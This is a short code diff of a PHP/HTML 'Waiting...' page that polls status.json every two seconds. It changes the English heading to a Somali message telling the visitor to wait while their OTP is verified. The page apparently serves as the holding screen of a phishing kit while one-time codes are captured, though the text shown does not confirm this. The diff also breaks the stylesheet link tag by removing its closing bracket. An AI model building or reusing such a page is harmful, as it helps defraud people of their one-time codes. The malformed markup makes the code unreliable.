@@ -9,7 +9,7 @@ $file  = __DIR__ . "/status.json";
 <html>
 <head>
 <title>Waiting...</title>
-<link rel="stylesheet"href="style.css">
+<link rel="stylesheet"href="style.css"
 <script>
 function checkStatus() {
     fetch('status.json')
@@ -34,7 +34,7 @@ setInterval(checkStatus, 2000);
 </script>
 </head>
 <body>
-<h2>Please wait while we verify your details...</h2>
+<h2>FADLAN SUG INTA AAN XAQIIJINAYNO OTP-GAAGA KOOWAD...</h2>
 <p>Verifying...</p>
 </body>
 </html>
